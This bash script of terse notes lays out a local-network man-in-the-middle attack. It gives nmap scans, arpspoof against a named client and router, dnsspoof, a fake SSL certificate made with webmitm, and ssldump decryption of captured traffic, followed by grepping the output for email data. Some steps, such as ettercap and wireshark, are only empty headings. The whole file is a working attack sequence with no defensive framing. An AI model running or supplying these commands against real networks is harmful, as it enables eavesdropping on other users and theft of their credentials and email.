#!/bin/bash

#----------------------------------------------------------------------------------------#
#	man in the middle - arp poisioning  #
#----------------------------------------------------------------------------------------#


# nmap scan for hosts on subnet
nmap -sP 192.168.1.1-199 

# port scan machine on ip address
nmap -sS 192.168.1.102

# ettercap arp poisioning


# wireshark capture packets


# wireshark filter by aim
# aim

#----------------------------------------------------------------------------------------#
#	man in the middle 2  #
#----------------------------------------------------------------------------------------#

# frag for mitm
fragrouter -B1

# arpspoof
arpspoof -t 192.168.1.139 192.168.1.1

# -t 192.168.1.139 = client
# 192.168.1.1 = router

# dnsspoof
dnsspoof

# ssl attack create a fake certifciate
webmitm -d

# scan with wireshark and save packets, then use ssldump
ssldump -r gmail -k webmin.crt -d > dump


# grep decrypted dump file
cat dump | grep Email


